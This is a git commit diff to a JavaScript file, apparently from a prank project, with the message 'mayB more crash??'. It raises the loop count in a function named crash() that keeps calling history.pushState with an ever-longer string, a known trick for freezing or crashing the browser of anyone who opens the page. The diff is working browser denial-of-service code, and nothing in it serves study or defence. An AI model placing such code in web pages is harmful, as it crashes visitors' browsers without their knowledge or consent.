16f12c3d04851d3660045ce889a4dc86a987dfbc
Vanaj Moorthy <vanajmoorthy@gmail.com>
2019-09-01 00:21:21 +0530

    mayB more crash??

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 function crash() {
     var total = "";
-    for (var i = 0; i < 100000; i++) {
+    for (var i = 0; i < 10000000; i++) {
         total += i.toString();
         history.pushState(0, 0, total);
     }
